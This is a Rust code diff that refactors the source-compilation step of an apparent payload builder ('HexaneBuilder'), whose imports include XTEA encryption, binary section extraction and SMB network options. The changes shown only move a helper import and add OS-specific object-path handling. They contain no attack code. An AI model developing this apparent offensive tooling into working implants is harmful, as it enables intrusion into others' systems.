@@ -13,8 +13,8 @@ use hexlib::types::NetworkType::Smb as SmbType;
 use hexlib::types::NetworkOptions::Smb as SmbOpt;
 
 use crate::rstatic::USERAGENT;
-use crate::binary::extract_section;
 use crate::interface::wrap_message;
+use crate::binary::{extract_section, run_command};
 use crate::cipher::{crypt_create_key, crypt_xtea};
 use crate::utils::{
     canonical_path_all,
@@ -23,7 +23,6 @@ use crate::utils::{
     generate_includes,
     generate_object_path,
     normalize_path,
-    run_command
 };
 
 
@@ -185,8 +184,9 @@ impl HexaneBuilder for hexlib::types::Hexane {
                 return Custom(e.to_string())
             })?;
 
+        let os = std::env::consts::OS;
         for path in entries {
-            let source = match std::env::consts::OS {
+            let source = match os {
                 "windows" => normalize_path(path.to_str().unwrap().into()),
                 "linux"   => path.clone().into_os_string().into_string().unwrap(),
                 _ => {
@@ -197,18 +197,20 @@ impl HexaneBuilder for hexlib::types::Hexane {
 
             let mut object_file = generate_object_path(&source, Path::new(build_dir))
                 .map_err(|e| {
-                    wrap_message("ERR", format!("compile_sources: {:?}:{e}", source)
-                        .as_str());
-
+                    wrap_message("ERR", format!("compile_sources: {:?}:{e}", source).as_str());
                     return Custom(e.to_string())
                 })?;
 
             object_file.set_extension("o");
-
-            let object = normalize_path(object_file
-                .to_string_lossy()
-                .to_string()
-            );
+                        
+            let object = match os {
+                "windows" => normalize_path(object_file.to_string_lossy().to_string()),
+                "linux"   => object_file.to_string_lossy().to_string(),
+                _ => {
+                    wrap_message("ERR", "unknown OS");
+                    return Err(Custom("unknown OS".to_string()))
+                }
+            };
 
             let mut command = String::new();
             match &path.extension().and_then(|ext| ext.to_str()) {
